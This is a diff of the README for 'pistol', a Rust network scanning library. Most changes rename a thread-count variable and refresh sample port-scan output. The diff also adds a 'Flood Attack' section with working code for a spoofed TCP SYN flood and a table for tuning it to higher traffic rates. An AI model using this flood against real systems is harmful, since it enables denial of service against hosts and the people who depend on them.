@@ -255,10 +255,10 @@ fn main() {
     }
     // Number of max attempts, it can also be understood as the maximum number of unsuccessful retries.
     let max_attempts = 2;
-    let threads_num = Some(8);
+    let num_threads = Some(8);
     let ret = tcp_syn_scan(
         &targets,
-        threads_num,
+        num_threads,
         src_ipv4,
         src_port,
         timeout,
@@ -271,7 +271,7 @@ fn main() {
 
 #### Output
 
-The local address I used for testing is 192.168.5.3. This address was skipped during the scan and no operation was performed. For the specific reasons, please see the end of the document **[Probe the loopback address and local machine](https://github.com/rikonaka/pistol-rs?tab=readme-ov-file#some-unsolvable-problems)** part.
+The local machine address I used for testing is `192.168.5.3`. This address's results should be skipped during the scan and no operation was performed. For the specific reasons, please see the end of the document **[Probe the loopback address and local machine](https://github.com/rikonaka/pistol-rs?tab=readme-ov-file#some-unsolvable-problems)** part.
 
 ```
 +------------+--------------+------------+------------+------------+
@@ -279,25 +279,27 @@ The local address I used for testing is 192.168.5.3. This address was skipped du
 +------------+--------------+------------+------------+------------+
 |     id     |     addr     |    port    |   status   | time cost  |
 +------------+--------------+------------+------------+------------+
-|     1      | 192.168.5.1  |     22     |  filtered  |   1.016s   |
+|     1      | 192.168.5.1  |     22     |  filtered  |   1.030s   |
 +------------+--------------+------------+------------+------------+
-|     2      | 192.168.5.2  |     22     |   closed   | 32.142 ms  |
+|     2      | 192.168.5.2  |     22     |   closed   |  1.064 ms  |
 +------------+--------------+------------+------------+------------+
-|     3      | 192.168.5.4  |     22     |    open    |  3.086 ms  |
+|     3      | 192.168.5.3  |     22     |  filtered  |   1.030s   | -> This result should be ignored
 +------------+--------------+------------+------------+------------+
-|     4      | 192.168.5.5  |     22     |    open    | 32.464 ms  |
+|     4      | 192.168.5.4  |     22     |  offline   |   1.040s   |
 +------------+--------------+------------+------------+------------+
-|     5      | 192.168.5.6  |     22     |  offline   |   1.039s   |
+|     5      | 192.168.5.5  |     22     |    open    |  0.954 ms  |
 +------------+--------------+------------+------------+------------+
-|     6      | 192.168.5.7  |     22     |  offline   |   1.034s   |
+|     6      | 192.168.5.6  |     22     |  offline   |   1.039s   |
 +------------+--------------+------------+------------+------------+
-|     7      | 192.168.5.8  |     22     |  offline   |   1.038s   |
+|     7      | 192.168.5.7  |     22     |  offline   |   1.039s   |
 +------------+--------------+------------+------------+------------+
-|     8      | 192.168.5.9  |     22     |  offline   |   1.016s   |
+|     8      | 192.168.5.8  |     22     |  offline   |   1.039s   |
 +------------+--------------+------------+------------+------------+
-|     9      | 192.168.5.10 |     22     |  offline   |   1.024s   |
+|     9      | 192.168.5.9  |     22     |  offline   |   1.039s   |
 +------------+--------------+------------+------------+------------+
-| total cost: 2.082s, avg cost: 0.208s, open ports: 2              |
+|     10     | 192.168.5.10 |     22     |  offline   |   1.039s   |
++------------+--------------+------------+------------+------------+
+| total cost: 2.057s, avg cost: 0.206s, open ports: 1              |
 +------------+--------------+------------+------------+------------+
 ```
 
@@ -370,11 +372,11 @@ fn main() {
     );
     let timeout = Some(Duration::from_secs_f64(0.5));
     let top_k = 3;
-    let threads_num = Some(8);
+    let num_threads = Some(8);
 
     // The `fingerprint` is the obtained fingerprint of the target OS.
     // Return the `top_k` best results (the number of os detect result may not equal to `top_k`), sorted by score.
-    let ret = os_detect(&[target], threads_num, src_ipv4, top_k, timeout).unwrap();
+    let ret = os_detect(&[target], num_threads, src_ipv4, top_k, timeout).unwrap();
     println!("{}", ret);
 }
 ```
@@ -437,8 +439,8 @@ fn main() {
 
     let timeout = Some(Duration::from_secs_f64(0.5));
     let top_k = 3;
-    let threads_num = Some(8);
-    let ret = os_detect(&[target], threads_num, src_ipv6, top_k, timeout).unwrap();
+    let num_threads = Some(8);
+    let ret = os_detect(&[target], num_threads, src_ipv6, top_k, timeout).unwrap();
     println!("{}", ret);
 }
 ```
@@ -469,9 +471,10 @@ According to the nmap [documentation](https://nmap.org/book/osdetect-guess.html#
 * 192.168.5.5 - Debian 12 (ssh: 22, apache httpd: 80, apache tomcat: 8080)
 
 ```rust
-use pistol::vs::vs_scan;
 use pistol::Target;
-use pistol::Host;
+use pistol::PistolRunner;
+use pistol::PistolLogger;
+use pistol::vs::vs_scan;
 use std::net::Ipv4Addr;
 use std::time::Duration;
 
@@ -493,10 +496,10 @@ fn main() {
     // only_udp_recommended = true: only try the udp probe recommended port
     let (only_null_probe, only_tcp_recommended, only_udp_recommended) = (false, true, true);
     let intensity = 7; // nmap default
-    let threads_num = Some(8);
+    let num_threads = Some(8);
     let ret = vs_scan(
         &[target],
-        threads_num,
+        num_threads,
         only_null_probe,
         only_tcp_recommended,
         only_udp_recommended,
@@ -534,6 +537,68 @@ fn main() {
 +----------+-------------+----------+----------+----------------------------------+-----------+
 ```
 
+## 4. Flood Attack
+
+```rust
+use pistol::Target;
+use pistol::PistolRunner;
+use pistol::PistolLogger;
+use pistol::flood::tcp_syn_flood;
+use std::net::Ipv4Addr;
+use std::time::Duration;
+
+fn main() {
+    let _pr = PistolRunner::init(PistolLogger::None, None, None).unwrap();
+
+    let dst_addr = Ipv4Addr::new(192, 168, 5, 5);
+    let ports = Some(vec![22]);
+    let target1 = Target::new(dst_addr.into(), ports);
+    let num_threads = 30; // It can be simply understood as the number of attack threads.
+    let retransmit_count = 3; // The number of times to retransmit the same attack packet.
+    let repeat_count = 10; // The number of times each thread repeats the attack.
+    let ret = tcp_syn_flood(&[target1], num_threads, retransmit_count, repeat_count).unwrap();
+    println!("{}", ret);
+}
+```
+
+For the above three parameters `num_threads`, `retransmit_count`, `repeat_count`, there is a vivid explanation. We generate a TCP SYN packet, including a fake source address and source port, and then we send this packet `3` times (`retransmit_count`) to the specific port of the target machine (the above example is port 22).
+
+After that, we regenerate a new fake source address and fake source port and form a new TCP SYN packet. We repeat this operation `10` times (`repeat_count`).
+
+Finally, we generate `30` threads (`num_threads`) to execute the above process.
+
+### Output
+
+We no longer use `threadpool` to limit the number of threads here, so please do it according to your ability (in the previous scan or ping function, we use `threadpool` to avoid system overload caused by too many threads when the target range is large).
+
+```
++-------------+------------------------------------------------------------+
+|                           Flood Attack Summary                           |
++-------------+------------------------------------------------------------+
+|    addr     |                           report                           |
++-------------+------------------------------------------------------------+
+| 192.168.5.5 | packets sent: 2500(98.340MB), time cost: 1.383(71.121MB/s) |
++-------------+------------------------------------------------------------+
+```
+
+Because `retransmit_count` and `repeat_count` only determine the number of times the same packet is retransmitted, I use their product as a variable. If you increase the `num_threads` or `retransmit_count` x `repeat_count` above, the speed of attacks traffic will increase.
+
+The relationship between the two variables in my local test environment
+
+| num_threads | retransmit_count x repeat_count | sending speed |
+| :---------- | :------------------------------ | :------------ |
+| 10          | 9                               | 11.850MB/s    |
+| 30          | 9                               | 36.284MB/s    |
+| 30          | 30                              | 39.266MB/s    |
+| 60          | 30                              | 83.709MB/s    |
+| 60          | 60                              | 98.077MB/s    |
+| 120         | 60                              | 206.687MB/s   |
+| 120         | 120                             | 204.607MB/s   |
+| 240         | 120                             | 0.451GB/s     |
+| 240         | 240                             | 0.551GB/s     |
+
+The above conclusions were drawn on my local VMware virtualized network card. The performance of the attack in a real attack environment depends on factors such as your network bandwidth and network card performance.
+
 ## Bugs About libpnet
 
 **libpnet bug on Windows**
@@ -550,7 +615,7 @@ Bug issue: https://github.com/libpnet/libpnet/issues/686
 
 **Probe the loopback address and local machine**
 
-Because the entire `pistol`'s sending and receiving methods are based on the datalink layer, and the loopback address does not support sending ethernet frame data, but only at the transport layer.
+Because the entire `pistol`'s sending and receiving methods except services scan are based on the datalink layer, and the loopback address does not support sending ethernet frame data, but only at the transport layer. This means that when I send any data to local machine, I will not receive any response data packets.
 
 And the transport layer design of `libpnet` lacks flexibility and customizability, for example there is `ipv4_packet_iter` method only and no `ipv6_packet_iter` method, it means that I cannot receive any ipv6 packets if I changes the `pistol`'s sending and receiving methods from datalink layer to transport layer, [reference](https://docs.rs/pnet/0.35.0/pnet/transport/index.html).
 
